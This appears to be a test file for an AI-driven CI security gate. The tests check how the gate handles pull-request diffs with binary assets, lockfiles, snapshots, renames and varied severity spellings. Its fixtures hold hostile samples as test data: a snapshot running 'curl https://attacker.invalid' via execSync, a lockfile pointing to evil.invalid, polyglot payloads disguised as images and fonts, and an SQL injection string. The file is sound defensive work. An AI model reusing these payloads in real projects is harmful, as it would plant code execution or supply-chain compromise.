        for name, head in (("NUL", {ROUTE: b"// \x00\n" + VULN}),
                           ("-diff", {".gitattributes": b"* -diff\n", ROUTE: VULN})):
            with self.subTest(name):
                code, board, models, requests = self.pr(head, {"glm-5": EMPTY_JSON})
                if name == "NUL":
                    self.assertEqual((code, models), (3, []))
                    self.assertIn("unread binary file", board)
                else:
                    self.assertIn("select * from pay", self.seen(requests))
                    self.assertEqual((code, models), (0, ["glm-5"]))
                # Without --text git prints "Binary files ... differ": never 0.
                for mode in ("warn", "block"):
                    code, board, models, _ = self.pr(head, {"glm-5": EMPTY_JSON}, no_text=True, mode=mode)
                    self.assertEqual((code, models), (3, []))
                    self.assertIn("NOT ANALYZED", board)
                    self.assertIn("unread binary file", board)
        code, board, _, _ = self.run_gate({"glm-5": EMPTY_JSON}, diff=f"diff --git a/{ROUTE} b/{ROUTE}\nGIT binary patch\nliteral 3\n")
        self.assertEqual(code, 3)
        # A binary image is not code: skipped, the code next to it is analysed.
        code, board, models, requests = self.pr({"public/logo.png": b"\x89PNG\x00\x01", ROUTE: VULN},
                                                {"glm-5": EMPTY_JSON}, no_text=True)
        self.assertEqual((code, models), (0, ["glm-5"]))
        self.assertNotIn("logo.png", self.seen(requests))
        self.assertIn("1 image/font file(s) left out of the analysis", board)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_P2_no_pathspec_lockfile_and_nothing_read_never_green(self):
        # A route inside a folder named like an image is still code.
        for seg in ("x.png", "logo.svg", "a.snap", "f.woff2"):
            with self.subTest(seg):
                _, _, models, requests = self.pr({f"src/app/api/{seg}/route.ts": VULN}, {"glm-5": EMPTY_JSON})
                self.assertEqual(models, ["glm-5"])
                self.assertIn(f"src/app/api/{seg}/route.ts", self.seen(requests))
        # SVG carries script: it is analysed.
        _, _, _, requests = self.pr({"public/a.svg": b"<svg onload=alert(1)></svg>\n"}, {"glm-5": EMPTY_JSON})
        self.assertIn("onload=alert", self.seen(requests))
        # Lockfile-only PR pointing a package at another host: the model reads it.
        lock = '{"packages":{"node_modules/x":{"resolved":"%s","integrity":"sha512-%s"}}}\n'
        base = dict(BASE, **{"package-lock.json": (lock % ("https://registry.npmjs.org/x/-/x-1.0.0.tgz", "A")).encode()})
        _, _, models, requests = self.pr({"package-lock.json": (lock % ("https://evil.invalid/x.tgz", "B")).encode()},
                                         {"glm-5": EMPTY_JSON}, base=base)
        self.assertEqual(models, ["glm-5"])
        self.assertIn("evil.invalid", self.seen(requests))
        for lockfile in ("package-lock.json", "apps/web/package-lock.json", "yarn.lock", "pnpm-lock.yaml"):
            self.assertTrue(porteiro.is_risky(lockfile), lockfile)  # kept when the diff is big
        # Round 5: a real binary image only: no AI call, 0 with a note (Q9 has more).
        for mode in ("warn", "block"):
            code, board, models, _ = self.pr({"public/logo.png": b"\x89PNG\x00\x01"}, {"glm-5": EMPTY_JSON}, mode=mode)
            self.assertEqual((code, models), (0, []))
            self.assertIn("only image/font files (1)", board)
        # A lone "\r" in the content cannot forge a header that hides the rest.
        _, _, _, requests = self.pr({ROUTE: b"// \rdiff --git a/x.png b/x.png\n" + VULN}, {"glm-5": EMPTY_JSON})
        self.assertIn("select * from pay", self.seen(requests))

    def test_P2b_file_listed_by_git_not_in_the_diff_gives_3(self):
        with tempfile.TemporaryDirectory() as d:
            dp, np_ = Path(d, "pr.diff"), Path(d, "pr.names")
            dp.write_text(f"diff --git a/{ROUTE} b/{ROUTE}\n+x\n", encoding="utf-8")
            np_.write_bytes(f"{ROUTE}\0src/gone.ts\0".encode())
            code, board, models, _ = self.run_gate({"glm-5": EMPTY_JSON}, real=(str(dp), str(np_)))
            self.assertEqual((code, models), (3, ["glm-5"]))
            self.assertIn("PARTIAL — 1 file(s) not read (not in the diff)", board)
            dp.write_text("", encoding="utf-8")  # empty diff, files changed
            code, board, models, _ = self.run_gate({"glm-5": EMPTY_JSON}, real=(str(dp), str(np_)))
            self.assertEqual((code, models), (3, []))
            self.assertNotIn("✅", board)

    def test_P3_severity_and_confidence_in_any_spelling_block(self):
        f = {"title": "SQLi", "file": "a", "line": 1, "severity": "critical", "confidence": 0.95}
        cases = {
            "confidence missing": {k: v for k, v in f.items() if k != "confidence"},
            "confidence 95%": dict(f, confidence="95%"),
            "confidence high": dict(f, confidence="high"),
            "confidence null": dict(f, confidence=None),
            "confidence 10**400": dict(f, confidence=10 ** 400),
            "pt crítica": dict(f, severity="crítica"),
            "CRITICAL": dict(f, severity="CRITICAL"),
            "high": dict(f, severity="high"),
            "pt Alta ": dict(f, severity="Alta "),
            "unknown": dict(f, severity="severe"),
        }
        for name, a in cases.items():
            with self.subTest(name):
                code, board, _, _ = self.run_gate({"glm-5": json.dumps({"findings": [a]})})
                self.assertEqual(code, 1)
                self.assertIn("1 blocker", board)
        code, _, _, _ = self.run_gate({"glm-5": '{"findings":[{"title":"t","file":"a","severity":"high","confidence":NaN}]}'})
        self.assertEqual(code, 1)
        # Round 5: the Portuguese keys are read too, so this one blocks at once...
        portuguese = json.dumps({"findings": [{"severidade": "critica", "arquivo": "a", "titulo": "SQLi"},
                                              {"title": "light", "file": "a", "severity": "low"}]})
        code, board, models, _ = self.run_gate({"glm-5": portuguese, "kimi-k3": EMPTY_JSON})
        self.assertEqual((code, models), (1, ["glm-5"]))
        # ...and keys in no known spelling next to a light one are out of format,
        # not "one warning": every AI tries, then 3.
        odd = json.dumps({"findings": [{"level": "critical", "path": "a", "name": "SQLi"},
                                       {"title": "light", "file": "a", "severity": "low"}]})
        code, board, models, _ = self.run_gate({m: odd for m in ("glm-5", "kimi-k3", "kimi-k2.6", "gpt-6-astra", "gpt-5.5")})
        self.assertEqual(code, 3)
        self.assertIn("NOT ANALYZED", board)
        self.assertIsNotNone(porteiro.normalize({"findings": [{"severity": "x"}, HIGH]}))  # blocking wins
        # Cut reply whose raw text (old Portuguese key) says "crítica" / "critical": a hint, never the next AI.
        for sev in ("crítica", "critical", "HIGH"):
            with self.subTest(sev):
                cut = '{"achados":[{"severidade": "%s","arquivo":"a","titulo":"SQL inj' % sev
                code, board, models, _ = self.run_gate({"glm-5": [(cut, "length"), Z1302], "kimi-k3": EMPTY_JSON})
                self.assertEqual((code, models), (3, ["glm-5"]))
                self.assertIn("hint of a serious finding", board)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_P4_serious_finding_never_vanishes(self):
        diff = f"diff --git a/{ROUTE} b/{ROUTE}\n+x\n"
        for path in (f"{ROUTE}:42", f"{ROUTE}:42:7", ROUTE.upper(), f"/home/runner/work/r/r/{ROUTE}", f".\\{ROUTE}"):
            with self.subTest(path):
                code, _, _, _ = self.run_gate({"glm-5": json.dumps({"findings": [dict(HIGH, file=path)]})}, diff=diff)
                self.assertEqual(code, 1)
                self.assertEqual(self.detail[-1].args[0][0]["file"], path)  # matched, not relabelled
        # No touched file matches: it still blocks, labelled in the private detail.
        code, board, _, _ = self.run_gate({"glm-5": json.dumps({"findings": [dict(HIGH, file="src/nothing.ts")]})}, diff=diff)
        self.assertEqual(code, 1)
        self.assertIn("1 blocker", board)
        self.assertIn("(unidentified file) src/nothing.ts", self.private)
        self.assertNotIn("nothing.ts", board)
        # Pre-rename name. Local run (git's rename detection): "rename from".
        old_path, new_path = "src/app/api/old/route.ts", "src/app/api/new/route.ts"
        body = b"".join(b"// line %d\n" % i for i in range(30))
        finding = json.dumps({"findings": [dict(HIGH, file=old_path)]})
        code, _, _, requests = self.pr({old_path: None, new_path: body + VULN}, {"glm-5": finding}, base={old_path: body},
                                       no_renames=True)
        self.assertIn(f"rename from {old_path}", self.seen(requests))
        self.assertEqual((code, self.detail[-1].args[0][0]["file"]), (1, old_path))
        # Round 5, the workflow (--no-renames): the model reads the deleted code.
        code, _, _, requests = self.pr({old_path: None, new_path: body + VULN}, {"glm-5": finding}, base={old_path: body})
        self.assertIn("-// line 0", self.seen(requests))
        self.assertEqual((code, self.detail[-1].args[0][0]["file"]), (1, old_path))

    def test_P5_duplicate_findings_do_not_erase_the_blocker(self):
        dup = '{"findings":[' + json.dumps(HIGH) + '],"findings":[]}'
        self.assertEqual(len(porteiro.extract_json(dup)["findings"]), 1)
        code, board, _, _ = self.run_gate({"glm-5": dup})
        self.assertEqual(code, 1)
        self.assertIn("1 blocker", board)
        self.assertEqual(len(porteiro.extract_json('{"findings":[],"findings":' + json.dumps([HIGH]) + "}")["findings"]), 1)
        # The old key and the new one add up as well.
        self.assertEqual(len(porteiro.extract_json('{"achados":' + json.dumps([HIGH]) + ',"findings":[]}')["findings"]), 1)

    def test_P6_public_log_without_balance_or_key_sentence(self):
        # Missing GLM/OpenAI keys, no Kimi quota, and the private alert failed.
        self.run_gate({"kimi-k3": KIMI_QUOTA, "kimi-k2.6": KIMI_QUOTA},
                      env={"KIMI_API_KEY": KEY}, channel="not delivered (HTTP 500)")
        self.assertIn("z.ai glm-5: no code", self.log)
        self.assertIn("Kimi kimi-k3: code exceeded_current_quota_error", self.log)
        for phrase in ("key", "balance", "top up"):
            self.assertNotIn(phrase, self.log)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_P7_submodule_not_analyzed(self):
        for before, after in ((None, "a" * 40), ("a" * 40, "b" * 40)):  # added, pointer moved
            diff = submodule_diff(before, after)
            self.assertIn("Subproject commit", diff)
            for mode in ("warn", "block"):
                with self.subTest(before=before, mode=mode):
                    code, board, models, _ = self.run_gate({"glm-5": EMPTY_JSON}, diff=diff, mode=mode)
                    self.assertEqual((code, models), (3, []))
                    self.assertIn("NOT ANALYZED", board)
                    self.assertIn("submodule", board)

    def test_P8_gatekeeper_tests_run_in_the_required_check(self):
        # "Lint, typecheck, test, build" (job `checks`) is a required check.
        yml = CI.read_text(encoding="utf-8")
        checks = yml.split("\n  checks:\n", 1)[1].split("\n  rls:\n", 1)[0]
        self.assertIn("python3 -m unittest scripts/test_porteiro.py", checks)
        self.assertIn("python3 scripts/porteiro.py --demo", checks)

    # ---- Round 5: asset skip only for real binary images/fonts (each failed on f625ccd) ----
    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_Q1_rename_from_code_to_asset_name_is_read(self):
        base = dict(BASE, **{"src/proxy.ts": PROXY})
        for ext in ("png", "snap", "woff2", "ico"):
            head = {"README.md": b"x\ny\n", "src/proxy.ts": None, f"src/proxy.{ext}": PROXY}
            for local in (False, True):  # the workflow (--no-renames) / a local run with renames
                with self.subTest(ext=ext, local=local):
                    _, _, models, requests = self.pr(head, {"glm-5": EMPTY_JSON}, base=base, no_renames=local)
                    self.assertEqual(models, ["glm-5"])
                    self.assertIn("src/proxy.ts", self.seen(requests))
                    if not local:  # the deleted auth code itself
                        self.assertIn("-export function proxy", self.seen(requests))
        # Binary code renamed (with a change) to an image name, local run: the
        # "rename from" name keeps it off the asset path. Without --text git
        # says "Binary files": 3. With --text the hunk (no NUL in it) is read.
        blob = b"// \x00\n" + b"".join(b"export const k%d = %d\n" % (i, i) for i in range(200))
        for no_text in (True, False):
            with self.subTest(binary=True, no_text=no_text):
                code, board, models, requests = self.pr(
                    {"README.md": b"x\ny\n", "src/a.ts": None, "src/a.png": blob + b"// x\n"}, {"glm-5": EMPTY_JSON},
                    base=dict(BASE, **{"src/a.ts": blob}), no_text=no_text, no_renames=True)
                if no_text:
                    self.assertEqual((code, models), (3, []))
                    self.assertIn("unread binary file", board)
                else:
                    self.assertIn("rename from src/a.ts", self.seen(requests))
                    self.assertIn("+// x", self.seen(requests))

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_Q2_symlink_and_submodule_with_asset_name_give_3(self):
        for name, entry, label in (("public/og.png", ("link", "../.env.local"), "symbolic link"),
                                   ("src/app/api/x/route.ts", ("link", "../../../../public/p.png"), "symbolic link"),
                                   ("vendor/lib.png", ("sub", "a" * 40), "submodule")):
            for mode in ("warn", "block"):
                with self.subTest(name=name, mode=mode):
                    code, board, models, _ = self.pr({"README.md": b"x\ny\n", name: entry},
                                                     {"glm-5": EMPTY_JSON}, mode=mode)
                    self.assertEqual((code, models), (3, []))
                    self.assertIn("NOT ANALYZED", board)
                    self.assertIn(label, board)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_Q3_text_only_image_or_font_goes_to_the_model(self):
        for name in ("public/p.png", "public/f.woff2", "favicon.ico"):
            for no_text in (False, True):
                with self.subTest(name=name, no_text=no_text):
                    _, _, models, requests = self.pr({name: VULN}, {"glm-5": EMPTY_JSON}, no_text=no_text)
                    self.assertEqual(models, ["glm-5"])
                    self.assertIn("select * from pay", self.seen(requests))

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_Q4_snapshot_is_code(self):
        # vitest runs snapshot files through new Function: they are code.
        self.assertNotIn(".snap", porteiro.ASSETS)
        head = {"src/x.test.ts": b"import {expect,test} from 'vitest'\ntest('x',()=>expect(1).toMatchSnapshot())\n",
                "src/__snapshots__/x.test.ts.snap":
                    b"require('child_process').execSync('curl https://attacker.invalid')\nexports[`x 1`] = `1`;\n"}
        _, _, models, requests = self.pr(head, {"glm-5": EMPTY_JSON})
        self.assertEqual(models, ["glm-5"])
        self.assertIn("execSync", self.seen(requests))
        # A NUL inside a comment is still valid JS: a binary snapshot is 3, never skipped.
        code, board, models, _ = self.pr({"README.md": b"x\ny\n", "src/__snapshots__/y.test.ts.snap":
                                          b"/*\x00*/ require('child_process').execSync('id')\n"}, {"glm-5": EMPTY_JSON})
        self.assertEqual((code, models), (3, []))
        self.assertIn("unread binary file", board)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_Q5_binary_that_is_not_image_or_font_gives_3(self):
        # With --text these arrive as mojibake: the model would answer [].
        pdf = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj\n"  # no NUL: only bytes that are not UTF-8
        # Round 6: fonts/images whose signature is printable (JS polyglot) are code too.
        for name, blob in (("src/lib/x.wasm", b"\x00asm\x01\x00\x00\x00\x01\x07\x01`\x02\x7f\x7f\x01\x7f"),
                           ("build/addon.node", b"MZ\x90\x00\x03\x00\x00\x00"), ("docs/a.pdf", pdf),
                           ("lib/a.jar", b"PK\x03\x04\x14\x00\x08\x00"), ("public/f.otf", b"OTTO\x00\x0b\x00\x80"),
                           ("public/f.woff", b"wOFF\x00\x01\x00\x00")):
            for mode in ("warn", "block"):
                with self.subTest(name=name, mode=mode):
                    code, board, models, _ = self.pr({name: blob, ROUTE: VULN}, {"glm-5": EMPTY_JSON}, mode=mode)
                    self.assertEqual((code, models), (3, []))
                    self.assertIn("unread binary file", board)
        # Real image/font bytes take the asset path: skipped, the code next to them is read.
        for name, blob in (("public/f.ttf", b"\x00\x01\x00\x00\x00\x0c\x00\x80"), ("public/p.jpg", JPG),
                           ("public/a.avif", b"\x00\x00\x00\x1cftypavif"), ("favicon.ico", b"\x00\x00\x01\x00\x01\x00"),
                           ("public/logo.png", PNG)):
            with self.subTest(name=name):
                code, _, models, requests = self.pr({name: blob, ROUTE: VULN}, {"glm-5": EMPTY_JSON})
                self.assertEqual((code, models), (0, ["glm-5"]))
                self.assertNotIn(name, self.seen(requests))
                self.assertIn("select * from pay", self.seen(requests))

    def test_Q6_severity_in_other_spellings(self):
        # The Portuguese severity words are still recognized.
        cases = {"baixo": "low", "médio": "medium", "medio": "medium", "alto": "high", "crítico": "critical",
                 "critico": "critical", "Moderate": "medium", "moderado": "medium", "moderada": "medium",
                 "info": "low", "Informational": "low", "informativo": "low", "informativa": "low",
                 "none": "low", "nenhuma": "low", "nenhum": "low", "grave": "high"}
        self.assertEqual({k: porteiro._sev(k) for k in cases}, cases)
        code, board, _, _ = self.run_gate({"glm-5": json.dumps({"findings": [dict(HIGH, severity="moderado")]})})
        self.assertEqual(code, 0)  # a warning, even in "block"
        self.assertIn("1 finding · 0 blockers", board)
        code, _, _, _ = self.run_gate({"glm-5": json.dumps({"findings": [dict(HIGH, severity="crítico")]})})
        self.assertEqual(code, 1)

    def test_Q7_keys_in_both_languages_and_title_without_severity(self):
        glm_only = {"GLM_API_KEY": KEY}
        cases = {
            "English": {"title": "SQLi", "severity": "critical", "file": "a", "line": 7, "confidence": 0.9},
            "pt mixed": {"titulo": "SQLi", "arquivo": "a", "severity": "critical"},
            "pt nivel": {"titulo": "SQLi", "arquivo": "a", "nivel": "critica"},
            "pt gravidade": {"titulo": "SQLi", "arquivo": "a", "gravidade": "alta"},
            "severity null": dict(HIGH, severity=None),
            "severity blank": dict(HIGH, severity=" "),
            "no severity": {"title": "SQLi", "file": "a"},
            "pt baixa and critical": dict(HIGH, severidade="baixa", severity="critical"),
        }
        for name, a in cases.items():
            with self.subTest(name):
                code, board, models, _ = self.run_gate({"glm-5": json.dumps({"findings": [a]})}, env=glm_only)
                self.assertEqual((code, models), (1, ["glm-5"]))
                self.assertIn("1 blocker", board)
        self.run_gate({"glm-5": json.dumps({"findings": [cases["English"]]})}, env=glm_only)
        a = self.detail[-1].args[0][0]
        self.assertEqual((a["title"], a["file"], a["line"], a["confidence"]), ("SQLi", "a", 7, 0.9))
        # "confidence" is read too: a low-confidence high is a warning.
        code, board, _, _ = self.run_gate({"glm-5": json.dumps({"findings": [
            {"title": "t", "severity": "high", "file": "a", "confidence": 0.3}]})}, env=glm_only)
        self.assertEqual(code, 0)
        self.assertIn("1 finding · 0 blockers", board)
        # Cut replies: "severity", or cut right inside the (old Portuguese) severity value.
        for cut in ('{"findings":[{"severity":"critical","file":"a","title":"SQL inj',
                    '{"achados":[{"titulo":"SQLi","arquivo":"a","severidade":"'):
            with self.subTest(cut=cut):
                code, board, models, _ = self.run_gate({"glm-5": [(cut, "length"), EMPTY_JSON], "kimi-k3": EMPTY_JSON})
                self.assertEqual((code, models), (3, ["glm-5"]))
                self.assertIn("hint of a serious finding", board)

    def test_Q8_risk_paths_alone_still_big_give_partial_without_ai(self):
        light = "diff --git a/README.md b/README.md\n+x\n"
        risk = "diff --git a/src/app/api/p.ts b/src/app/api/p.ts\n" + "+y\n" * 1000
        for mode in ("warn", "block"):
            with self.subTest(mode=mode):
                code, board, models, _ = self.run_gate({"glm-5": EMPTY_JSON}, env=dict(ALL_KEYS, PORTEIRO_MAX_DIFF_KB="1"),
                                                       mode=mode, diff=light + risk)
                self.assertEqual((code, models), (3, []))
                self.assertIn("PARTIAL — 2 file(s) not read (big diff)", board)
                self.assertIn("even with only the risk paths", board)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_Q9_pr_with_only_real_image_or_font_passes(self):
        for head in ({"public/logo.png": PNG}, {"public/f.ttf": b"\x00\x01\x00\x00\x00\x0c", "public/p.jpg": JPG}):
            for no_text in (False, True):
                for mode in ("warn", "block"):
                    with self.subTest(head=list(head), no_text=no_text, mode=mode):
                        code, board, models, _ = self.pr(head, {"glm-5": EMPTY_JSON}, no_text=no_text, mode=mode)
                        self.assertEqual((code, models), (0, []))
                        self.assertIn(f"only image/font files ({len(head)})", board)
        # Round 6: WOFF2/WebP signatures are printable (JS polyglot): not skipped, binary -> 3.
        for no_text in (False, True):
            code, board, models, _ = self.pr({"public/f.woff2": b"wOF2\x00\x01\x00\x00",
                                              "public/a.webp": b"RIFF\x1a\x00\x00\x00WEBPVP8 "},
                                             {"glm-5": EMPTY_JSON}, no_text=no_text)
            self.assertEqual((code, models), (3, []))
            self.assertIn("unread binary file (2", board)
        # ...but never when git lists a file the diff does not carry.
        with tempfile.TemporaryDirectory() as d:
            dp, np_ = real_pr(d, BASE, {"public/logo.png": PNG})
            Path(np_).write_bytes(Path(np_).read_bytes() + b"src/gone.ts\0")
            code, board, models, _ = self.run_gate({"glm-5": EMPTY_JSON}, real=(dp, np_))
        self.assertEqual((code, models), (3, []))
        self.assertIn("PARTIAL", board)

    # ---- Round 6: adversarial review of de5b824 (each failed there) ----
    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_R1_the_gates_own_diff_is_not_binary(self):
        # This PR's own diff: porteiro.py once held a literal U+FFFD and the gate
        # called ITSELF an unread binary file. Only added lines count now.
        path, fffd = "scripts/porteiro.py", chr(0xFFFD)
        source = Path(porteiro.__file__).read_bytes()
        literal = source.decode("utf-8").replace("\\" + "ufffd", fffd)  # the source as it was on de5b824
        self.assertIn(fffd, literal)
        lines = literal.split("\n")
        i = next(n for n, l in enumerate(lines) if fffd in l)
        lines[i - 2] += "  # typo"  # one-line edit next to a U+FFFD context line
        for name, base, head in (("new porteiro.py", BASE, {path: source}),
                                 ("U+FFFD only on '-' lines", {path: literal.encode()}, {path: source}),
                                 ("U+FFFD only on context lines", {path: literal.encode()}, {path: "\n".join(lines).encode()})):
            with self.subTest(name):
                with tempfile.TemporaryDirectory() as d:
                    diff = Path(real_pr(d, base, head)[0]).read_bytes().decode("utf-8", "replace")
                self.assertEqual([a for a, p in porteiro.blocks(diff) if porteiro.is_binary(p)], [])
                code, _, models, _ = self.pr(head, {"glm-5": EMPTY_JSON}, base=base)
                self.assertEqual((code, models), (0, ["glm-5"]))

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_R2_asset_decided_by_the_new_side(self):
        og, base = "public/og.png", dict(BASE, **{"public/og.png": real_png(32, 32, 1)})
        # A real PNG modified, or deleted: skipped, no AI call.
        for name, head in (("modified", {og: real_png(32, 32, 2)}), ("deleted", {og: None})):
            with self.subTest(name):
                code, board, models, _ = self.pr(head, {"glm-5": EMPTY_JSON}, base=base)
                self.assertEqual((code, models), (0, []))
                self.assertIn("only image/font files (1)", board)
        # Old image overwritten with JS text (NUL only on '-' lines): the model reads it.
        # Same when the signature line stays and only text is added after it.
        signed = dict(BASE, **{og: b"\x89PNG\r\n\x00\x01\nx\n"})
        for name, b, head in (("overwrite", base, {og: PAYLOAD}),
                              ("overwrite + loader", base, {og: PAYLOAD, "next.config.ts": b"require('./public/og.png')\n"}),
                              ("signature kept, text added", signed, {og: b"\x89PNG\r\n" + PAYLOAD + b"x\n"})):
            with self.subTest(name):
                _, _, models, requests = self.pr(head, {"glm-5": EMPTY_JSON}, base=b)
                self.assertEqual(models, ["glm-5"])
                self.assertIn("execSync", self.seen(requests))
        # Binary that JS still parses (printable start, NUL in a comment): never skipped, 3.
        loader = {"next.config.ts": b"require('./public/x.png')\n"}
        for name, blob in (("public/x.png", b"/*\x00*/" + PAYLOAD), ("public/a.webp", b"RIFF=1/*\x00WEBP*/;" + PAYLOAD),
                           ("public/f.woff", b"wOFF=1/*\x00*/;" + PAYLOAD), ("public/f.woff2", b"wOF2=1/*\x00*/;" + PAYLOAD),
                           ("public/a.gif", b"GIF89a=1/*\x00*/;" + PAYLOAD), ("public/f.otf", b"OTTO=1/*\x00*/;" + PAYLOAD)):
            with self.subTest(name):
                code, board, models, _ = self.pr(dict(loader, **{name: blob}), {"glm-5": EMPTY_JSON})
                self.assertEqual((code, models), (3, []))
                self.assertIn("unread binary file", board)
        # Line 1 not in the first hunk: nothing proves the start, so not skipped (3).
        # a) a real image whose first lines did not change; b) a text .png in main
        # whose later lines turn binary right after NUL context lines.
        text = b"a\n" * 8
        cases = (("line 1 unchanged", dict(BASE, **{og: real_png(32, 32, 1, text)}), {og: real_png(32, 32, 2, text)}),
                 ("NUL context", dict(BASE, **{og: PAYLOAD + b"a\n" * 6 + b"\x00\n" * 3 + b"z\n"}),
                  {og: PAYLOAD + b"a\n" * 6 + b"\x00\n" * 3 + b"\x00\x01\n"}))
        for name, b, head in cases:
            with self.subTest(name):
                code, board, models, _ = self.pr(head, {"glm-5": EMPTY_JSON}, base=b)
                self.assertEqual((code, models), (3, []))
                self.assertIn("unread binary file", board)

    def test_R3_finding_started_and_cut_gives_3(self):
        cuts = {
            "C1 title first": '{"findings":[{"title":"SQL injection in /api/pay","file":"a","line":1,"why":"concatenates the id',
            "C2 Portuguese": '{"achados":[{"titulo":"SQL injection","arquivo":"a","porque":"id is concatenated',
            "C3 inside the key name": '{"findings":[{"severit',
            "C4 before the value quote": '{"findings":[{"severity":',
            "E2 after the value quote": '{"findings":[{"title":"SQLi","file":"a","severity":"',
            "achados": '{"achados":[{"titulo":"SQLi","arquivo":"a',
            "second list": '{"findings":[],"findings":[{"title":"SQLi',
        }
        for name, cut in cuts.items():
            for finish in ("length", "stop"):
                with self.subTest(name, finish=finish):
                    code, board, models, _ = self.run_gate({"glm-5": [(cut, finish), EMPTY_JSON], "kimi-k3": EMPTY_JSON})
                    self.assertEqual((code, models), (3, ["glm-5"]))  # no retry, no reserve
                    self.assertIn("hint of a serious finding", board)
        # Cut after a closed empty list is not a finding: the retry may answer.
        code, _, models, _ = self.run_gate({"glm-5": [('{"findings":[]', "length"), EMPTY_JSON]})
        self.assertEqual((code, models), (0, ["glm-5", "glm-5"]))

    def test_R4_repeated_keys_and_finding_outside_the_list(self):
        serious = {"title": "SQLi", "file": "a", "severity": "critical"}
        block = {
            "D6b pt severidade critica then baixa": '{"achados":[{"titulo":"SQLi","arquivo":"a","severidade":"critica","severidade":"baixa"}]}',
            "severity critical then low": '{"findings":[{"title":"SQLi","file":"a","severity":"critical","severity":"low"}]}',
            "pt achados [] + findings": json.dumps({"achados": [], "findings": [serious]}),
            "findings only": json.dumps({"findings": [serious]}),
            "pt confianca 0.3 + confidence 0.95": json.dumps({"findings": [dict(serious, confianca=0.3, confidence=0.95)]}),
            "confidence 0.95 then 0.3": '{"findings":[{"title":"SQLi","file":"a","severity":"high","confidence":0.95,"confidence":0.3}]}',
        }
        for name, reply in block.items():
            with self.subTest(name):
                code, board, models, _ = self.run_gate({"glm-5": reply, "kimi-k3": EMPTY_JSON})
                self.assertEqual((code, models), (1, ["glm-5"]))
                self.assertIn("1 blocker", board)
        # The old "achados" is the list itself too: empty is a clean 0, a light one a warning.
        for reply, expected in (('{"achados":[]}', "✅ **0 findings**"),
                                (json.dumps({"achados": [dict(serious, severity="low")]}), "1 finding · 0 blockers")):
            with self.subTest(reply):
                code, board, models, _ = self.run_gate({"glm-5": reply, "kimi-k3": EMPTY_JSON})
                self.assertEqual((code, models), (0, ["glm-5"]))
                self.assertIn(expected, board)
        # A finding outside the list, or a "findings" that is not a list, is out of format.
        # With a raw critical it is a hint at once (3, no reserve); a nested
        # "findings" list is rescued and its critical blocks (1)...
        every = ("glm-5", "kimi-k3", "kimi-k2.6", "gpt-6-astra", "gpt-5.5")
        for name, reply, expected in (
                ("vulnerabilities", json.dumps({"findings": [], "vulnerabilities": [serious]}), 3),
                ("nested", json.dumps({"findings": [], "result": {"findings": [serious]}}), 1),
                ("findings object then []", '{"findings":' + json.dumps(serious) + ',"findings":[]}', 3)):
            with self.subTest(name):
                code, board, models, _ = self.run_gate({m: reply for m in every})
                self.assertEqual((code, models), (expected, ["glm-5"]))
                self.assertIn("NOT ANALYZED" if expected == 3 else "1 blocker", board)
        # ...and with only a title every AI tries, then 3.
        only_title = json.dumps({"findings": [], "vulnerabilities": [{"title": "SQLi", "file": "a"}]})
        code, board, models, _ = self.run_gate({m: only_title for m in every})
        self.assertEqual((code, models.count("glm-5"), models[-1]), (3, 3, "gpt-5.5"))
        self.assertIn("no AI available", board)

    def test_R5_light_severity_in_other_words(self):
        cases = {"minor": "low", "Trivial": "low", "negligible": "low", "N/A": "low", "nit": "low",
                 "note": "low", "informativo": "low", "Low (informational)": "low", "Medium (CVSS 5.3)": "medium",
                 "low/critical": "critical", "high / medium": "high", "baixa/crítica": "critical", "(low)": "high"}
        self.assertEqual({k: porteiro._sev(k) for k in cases}, cases)
        code, board, _, _ = self.run_gate({"glm-5": json.dumps({"findings": [dict(HIGH, severity="Minor")]})})
        self.assertEqual(code, 0)  # a warning, even in "block"
        self.assertIn("1 finding · 0 blockers", board)

    # ---- Round 7: adversarial review of 4ee3cb1 (each failed there) ----
    def test_S1_capitalised_keys_block_on_the_1st_reply(self):
        # main's old raw severity check had re.I. A capitalised key thrown away meant
        # a retry, and a later [] passed with 0 (main: 3).
        for name, reply in {
                "pt Severidade/Titulo": '{"achados":[{"Severidade":"critica","Titulo":"SQLi","Arquivo":"a","Linha":1,"Confianca":0.95}]}',
                "pt SEVERIDADE upper": '{"achados":[{"SEVERIDADE":"ALTA","TITULO":"SQLi","ARQUIVO":"a"}]}',
                "Severity/Title": '{"findings":[{"Severity":"Critical","Title":"SQLi","File":"a"}]}',
                "pt Achados key": '{"Achados":[{"severidade":"critica","titulo":"SQLi","arquivo":"a"}]}',
                "FINDINGS key": '{"FINDINGS":[{"SEVERITY":"HIGH","TITLE":"SQLi","FILE":"a"}]}'}.items():
            for finish in ("stop", "length"):
                with self.subTest(name, finish=finish):
                    code, board, models, _ = self.run_gate({"glm-5": [(reply, finish), EMPTY_JSON], "kimi-k3": EMPTY_JSON})
                    self.assertEqual((code, models), (1, ["glm-5"]))
                    self.assertIn("1 blocker", board)
        # Out of format with a capitalised raw severity: a hint at once (3, no retry).
        outside = '{"findings":[],"Vulnerabilities":[{"Severidade":"critica","Titulo":"SQLi"}]}'
        code, board, models, _ = self.run_gate({"glm-5": [outside, EMPTY_JSON], "kimi-k3": EMPTY_JSON})
        self.assertEqual((code, models), (3, ["glm-5"]))
        self.assertIn("hint of a serious finding", board)

    def test_S2_cut_anywhere_after_the_finding_never_gives_0(self):
        # exp5's sweep: reply[:n] with finish "length", then []. No prefix after the
        # finding's "{" may end in 0.
        g = {"title": "SQL injection", "file": "a", "line": 1, "why": "id concatenated", "how_to_exploit": "id=1 or 1=1"}
        full = {
            "severity first": json.dumps({"findings": [{"severity": "critical", **g, "confidence": 0.95}]}),
            "title first": json.dumps({"findings": [{**g, "severity": "high", "confidence": 0.9}]}),
            "pt achados": json.dumps({"achados": [{"titulo": "SQLi", "arquivo": "a", "porque": "id concat",
                                                   "severidade": "critica", "confianca": 0.9}]}),
            "fenced": "Result:\n```json\n" + json.dumps({"findings": [{"title": "SQLi", "severity": "critical",
